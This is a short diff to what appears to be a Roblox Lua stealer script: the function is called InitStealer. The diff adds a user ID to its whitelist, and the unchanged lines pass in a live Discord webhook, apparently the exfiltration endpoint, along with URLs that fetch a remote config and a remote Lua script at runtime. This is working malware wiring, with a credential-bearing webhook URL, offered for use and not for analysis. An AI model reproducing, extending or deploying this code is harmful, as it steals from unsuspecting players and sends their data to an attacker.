@@ -837,7 +837,7 @@ local function InitStealer(UserWhitelist: {number}, Webhook: string, Whitelisted
 end
 
 return InitStealer(
-	{2623169493},
+	{2623169493, 1047362715},
 	"https://discord.com/api/webhooks/1516638220400594995/TLH50PsoMCV5_jsTjXd7ti4vV8WpFpVpwu69HWAzWRq8Pwgv74NMfhC-u88hVrboeN7k",
 	HttpService:JSONDecode(HttpRequest("https://raw.githubusercontent.com/Chris12980/ssshdhd/refs/heads/main/sssrhr.json", "GET", {200}).Body),
 	"https://raw.githubusercontent.com/micahfish333-max/shark_hub/refs/heads/main/shark_hub.lua"
